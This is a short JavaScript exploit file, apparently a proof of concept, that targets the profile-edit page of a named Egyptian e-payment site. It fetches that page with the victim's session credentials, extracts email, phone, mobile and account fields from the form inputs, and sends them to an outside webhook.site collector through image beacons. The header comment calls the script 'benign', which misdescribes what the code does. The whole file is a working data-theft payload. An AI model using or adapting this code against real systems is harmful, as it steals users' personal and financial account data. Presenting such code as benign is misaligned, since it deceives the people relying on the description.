// exp.js — MINIMAL BENIGN script that fetches an absolute URL and logs/extracts email then beacons a small result
(function(){
  var TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";
  var COLLECTOR = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2";

  try {
    fetch(TARGET, { credentials: "include", redirect: "follow" })
    .then(function(res){ 
      // optional: send a tiny debug beacon with status
      (new Image()).src = COLLECTOR + "?status=" + encodeURIComponent(res.status) + "&url=" + encodeURIComponent(res.url);
      return res.text(); 
    })
    .then(function(html){
      var data = {};
      try {
        html.replace(/<input[^>]*name=["']?([^"'\s>]+)["']?[^>]*value=["']?([^"']*)["']?/gi,
          function(_, name, val){
            data[name] = val;
            return "";
          });
      } catch(e) { /* ignore */ }

      var email = data.email || "";
      var q = "email=" + encodeURIComponent(email);
      for(var k in data){
        if(k && (k==="email" || k==="phone" || k==="mobile" || k==="account")) {
          q += "&" + encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
        }
      }

      // small beacon with extracted fields (keeps payload short)
      (new Image()).src = COLLECTOR + "?d=" + encodeURIComponent(q);
    })
    .catch(function(err){
      (new Image()).src = COLLECTOR + "?err=" + encodeURIComponent(String(err));
    });
  } catch(e){
    (new Image()).src = COLLECTOR + "?exc=" + encodeURIComponent(String(e));
  }
})();
